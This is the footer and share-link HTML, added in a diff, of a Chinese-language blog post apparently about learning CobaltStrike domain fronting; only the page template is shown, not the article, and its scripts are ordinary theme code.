+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&text=CobaltStrike域前置学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&title=CobaltStrike域前置学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&is_video=false&description=CobaltStrike域前置学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CobaltStrike域前置学习&body=Check out this article: https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&title=CobaltStrike域前置学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&title=CobaltStrike域前置学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&title=CobaltStrike域前置学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&title=CobaltStrike域前置学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&name=CobaltStrike域前置学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&t=CobaltStrike域前置学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    givemefivw
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://infrequent-lantana-ee5.notion.site/961c291860d74e2ab7c7a32fd3eb08b7?v=466c252155394b439a6c6189f0ec2384">安全文摘</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+  
+        <!-- 不蒜子统计 -->
+        <span id="busuanzi_container_site_pv">
+                本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span class="post-meta-divider"></span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
